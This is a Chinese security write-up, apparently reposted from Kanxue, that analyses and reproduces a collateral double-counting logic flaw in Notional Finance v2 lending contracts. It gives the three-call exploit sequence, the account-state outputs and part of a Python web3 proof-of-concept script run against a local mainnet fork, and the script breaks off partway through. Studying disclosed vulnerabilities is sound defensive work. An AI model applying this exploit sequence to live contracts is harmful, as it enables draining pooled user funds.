---
title: Notional Double Counting Free Collateral 分析和复现
url: https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458490765&idx=1&sn=27c79edaca0efbde1cc2dadfdc6b7e53&chksm=b18ea70786f92e111c980d570c1686005a98480e522ee37144e8d9e61f1e360807f0cb3998b5&scene=58&subscene=0#rd
source: 看雪学院
date: 2023-01-06
fetch_date: 2025-10-04T03:10:09.009051
---

# Notional Double Counting Free Collateral 分析和复现

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8EqlVnXQnjo2icNibuqRiaO6IsxhYXm8FicDyYrgyVsJS9XzYicTTnlZZPgulAsfRhsGxCaTKBzr0pN1vg/0?wx_fmt=jpeg)

# Notional Double Counting Free Collateral 分析和复现

ghostmazeW

看雪学苑

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8EqlVnXQnjo2icNibuqRiaO6Is0VjqDecKs0O6OdYzwLsJeVn8oE39tzpdClg4s1kMesVicJVdN2KDNHA/640?wx_fmt=jpeg)

本文为看雪论坛优秀文章

看雪论坛作者ID：ghostmazeW

```
一

漏洞描述
```

Notional（*https://notional.finance/portfolio/*） 简单说来就是一个固定周期，固定利率的借贷池，主要支持Borrow,lend以及Provide Liquidity的功能。在notional v2中有一个free collateral的概念，根据你的free collateral的计算的值可以借贷出相应价值的代币，而这个漏洞就是在free collateral的计算上出现了问题，导致可以双重计数，从而能够以较低的抵押贷出比抵押价值要多的代币出来，利用该漏洞可以掏空整个LP中的所有资金。

漏洞类型：逻辑

难度：中等

赏金：100万刀

##

##

```
二

漏洞分析
```

1. 通过分析复现，发现本次漏洞的成因非常简单，就是在用户账户关键参数的读写上存在逻辑问题，导致能够双重计数。废话不多说，顺着调用链分析，首先是调用了enableBitmapCurrency() 来将用户的accountContext.bitmapCurrencyId = currencyId;设置为currencyId。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8EqlVnXQnjo2icNibuqRiaO6IsXpapNMe3KdDM7oK7xT7ibkjQAiaygxpBUCk9zv4ALaTVtzRZl7Imlribg/640?wx_fmt=png)

先看看调用前getAccount()的值：（getAccount()返回的是一个数据结构体，可以跟进分析数据结构）

[(0, b'\x00', 0, 0, b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), [(0, 0, 0, 0, 0), (0, 0, 0, 0, 0), (0, 0, 0, 0, 0), (0, 0, 0, 0, 0), (0, 0, 0, 0, 0), (0, 0, 0, 0, 0), (0, 0, 0, 0, 0), (0, 0, 0, 0, 0), (0, 0, 0, 0, 0), (0, 0, 0, 0, 0)], []]

接下来调用enableBitmapCurrency(1)，将currencyId =1 的代币设置为bitmapCurrencyId后：

[(1641427200, b'\x00', 0, 1, b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), [(1, 0, 0, 0, 0), (0, 0, 0, 0, 0), (0, 0, 0, 0, 0), (0, 0, 0, 0, 0), (0, 0, 0, 0, 0), (0, 0, 0, 0, 0), (0, 0, 0, 0, 0), (0, 0, 0, 0, 0), (0, 0, 0, 0, 0), (0, 0, 0, 0, 0)], []]

此处可以看到，accountContext.bitmapCurrencyId 已经被设置成了1，且再次调用getAccount()，可以通过代码知道accountBalances[0]的值已经被赋值，因为此处我们只enable了bitmap，没有deposit任何代币，所以此处accountBalances[0]为(1, 0, 0, 0, 0)是没有任何问题的。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8EqlVnXQnjo2icNibuqRiaO6Ism5GcnjTu7IFlULQ8Q6InHibTTzoateCFSSMgicUE37mDSjm4Nh5ZSGWw/640?wx_fmt=png)

2.此时在进行第二步操作，利用depositUnderlyingToken()向我们个人地址中deposit代币，此处用DAI作为例子，DAI的currencyId为2，这个可以直接通过代理合约调用接口查看。

[(1641427200, b'\x00', 0, 1, b'@\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), [(1, 0, 0, 0, 0), (2, 18344299339310, 0, 0, 0), (0, 0, 0, 0, 0), (0, 0, 0, 0, 0), (0, 0, 0, 0, 0), (0, 0, 0, 0, 0), (0, 0, 0, 0, 0), (0, 0, 0, 0, 0), (0, 0, 0, 0, 0), (0, 0, 0, 0, 0)], []]

在充值完成后，查看账户信息，发现

accountContext.activeCurrencies被赋值b'400200000000000000000000000000000000'

accountBalances[1]被赋值为了(2, 18344299339310, 0, 0, 0)

accountContext.activeCurrencies变量的修改，来自于depositUnderlyingToken中的 balanceState.finalize(account, accountContext, false);可以跟进看看。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8EqlVnXQnjo2icNibuqRiaO6IscTZO9BXL62Pwr6fTMknojia59M86f7mNby95BsC8wlYO7fHVttcaB4A/640?wx_fmt=png)

在.finalize(account, accountContext, false);中accountContext.setActiveCurrency会将 accountContext.activeCurrencies修改。但这不是重点。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8EqlVnXQnjo2icNibuqRiaO6Isrec628jgSXhZMRbHAVLqJ4mCOMDqiaylwMg255hdqGqRT7uy9LslwBw/640?wx_fmt=png)
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8EqlVnXQnjo2icNibuqRiaO6IsIbkMKVPozw6hZ88M5fsu7RIgH5CKp4mAt0JzdltrtQZ9uLFpkvZbBg/640?wx_fmt=png)

此处查看getAccount()方法，如果accountContext.activeCurrencies存在的话，会去从存储中读取该代币的值，accountBalances = new AccountBalance[](10); accountBalances是一个长度为10数组，如果开始不是很清楚的话为啥是10的话，这个地方就能非常明白，在开启bitmapcurrency第一个数组是用来放账户中ETH的balance数据的，后面的9个数组是用来放其中支持的9种代币的balance数据的，bytes18即每2个字节代表一个代币。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8EqlVnXQnjo2icNibuqRiaO6IsrjGB9IAf0Ze5FWcXchslHyqUhz70oApmsLAyNvmKdQcEV17tCicdTAA/640?wx_fmt=png)

到此，程序都是正常运行的，我们enable了currencyId == 1 的ETH，但是没有充值，所以ETH的balance数据为(1, 0, 0, 0, 0)，第二步我们充值了DAI，所以DAI的balance为(2, 18344299339310, 0, 0, 0)，这些都没有问题。

3.接下来进行第三步，再次enableBitmapCurrency()，此时将DAI的currencyId 作为参数。执行完成后，查看Account。此时发现accountBalances的前两个数组的值变成一样了，也就是说ETH所在的balance被DAI的balance覆盖了。

[(1641427200, b'\x00', 0, 2, b'@\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), [(2, 18344299339310, 0, 0, 0), (2, 18344299339310, 0, 0, 0), (0, 0, 0, 0, 0), (0, 0, 0, 0, 0), (0, 0, 0, 0, 0), (0, 0, 0, 0, 0), (0, 0, 0, 0, 0), (0, 0, 0, 0, 0), (0, 0, 0, 0, 0), (0, 0, 0, 0, 0)], []]

同时查看：free\_collateral: [212752332, [18344299339310, 18344299339310, 0, 0, 0, 0, 0, 0, 0, 0]],发现价值翻倍了。

再来看看getAccount()中设置ETH balance的代码，如果accountContext.isBitmapEnabled()，则会以bitmapCurrencyId所代表的代币balance来赋值到accountBalances[0]。OK，问题就在这里，也就是说通过修改bitmapCurrencyId的值能覆盖ETH所代表的balance位的值，实现double couting。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8EqlVnXQnjo2icNibuqRiaO6IsBDfibhT6ia0LqbocySxrZkduuNqev9qDne28D7RUZPp6v0UiaVfOlpx7A/640?wx_fmt=png)

##

##

```
三

漏洞复现
```

对于漏洞的复现，其实步骤很简单。
源码：https://github.com/notional-finance/contracts-v2

npx hardhat node --fork https://eth-mainnet.alchemyapi.io/v2/your\_key --fork-block-number 13950000

（1）enableBitmapCurrency(1) //启用bitmap,将ETH设置为bitmapCurrency。

（2）depositUnderlyingToken(useraddr,2,amount) //充值DAI

此处如果没有DAI，需要先到swap购买DAI，然后approve notional的代理合约地址。

（3）enableBitmapCurrency(2) //启用bitmap,将DAI设置为bitmapCurrency。

此3步就能完全复现漏洞。

具体的POC，我是直接用python web3调用的，也可以自己构造或者用contract实现。

这是我临时用的py 测试脚本，可以参考。

```
from web3 import Web3from Constant import Abiimport binascii class Poc:    def __init__(self):        self.web3 = Web3(Web3.HTTPProvider('http://127.0.0.1:8545'))        #self.web3 = Web3(Web3.HTTPProvider("https://mainnet.infura.io/v3/yourkey"))        self.NationalAbi = Abi.NationalAbi        #self.addr = '0xdE14D5F07456c86F070C108A04Ae2fafdbD2A939'        self.addr = "0x1344A36A1B56144C3Bc62E7757377D288fDE0369"        self.uni_router = "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D"        self.cdai_address = "0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643"        self.dai_address = "0x6B175474E89094C44Da98b954EedeAC495271d0F"        self.uniswap_router_abi = Abi.UniswapRouter2        self.cdai_abi = Abi.CDaiAbi        self.dai_abi = Abi.DaiAbi        self.contract = self.web3.eth.contract(address=self.addr, abi=self.NationalAbi)        self.uniswapRouter =self.web3.eth.contract(address=self.uni_router,abi=self.uniswap_router_abi)        self.cdai_token = self.web3.eth.contract(address=self.cdai_address,abi=self.cdai_abi)        self.dai_token = self.web3.eth.contract(address=self.dai_address,abi=self.dai_abi)        self.privatekey = "your privatekey"        self.account = self.web3.eth.account.from_key(self.privatekey)        self.txParams = {            'chainId': 31337, #hardhat chianid            'nonce': self.web3.eth.getTransactionCount(self.account.address),            'gas': 2000000,            'from': self.account.address,            # 'value': Web3.toWei(0, 'ether'),            'gasPrice': self.web3.eth.gasPrice,        }     def get_free_collateral(self, address):        '''           获取        :param address:        :return:        '''        result = self.contract.functions.getFreeCollateral(address).call()        print(result)     def enable_bitmapCurrency(self, currencyid):        '''        开启bitmapCurrency        :return:        '''        tx = self.contract.functions.enableBitmapCurrency(currencyid).buildTransaction(self.txParams)        signed_txn = self.web3.eth.account.signTransaction(tx, private_key=self.privatekey)  # 账号交易签名        res = self.web3.eth.send_raw_transaction(signed_txn.rawTransaction).hex()  # 发送原始签名        print(res)        txn_receipt = self.web3.eth.wait_for_transaction_receipt(res)  # 接受交易结果，并返回交易结果        print(txn_receipt)        return txn_receipt        # signed = self.account.signTransaction(tx)  # 用账户对交易签名        # tx_id = self.web3.eth.sendRawTransaction(signed.rawTransaction)  # 交易发送并获取交易id        # tx_hash = self.contract.functions.enableBitmapCurrency(currencyid).transact()        # result = self.web3.eth.wait_for_transaction_receipt(tx_hash)        # print(result)     def swap_eth_for_exact_tokens(self,amounto...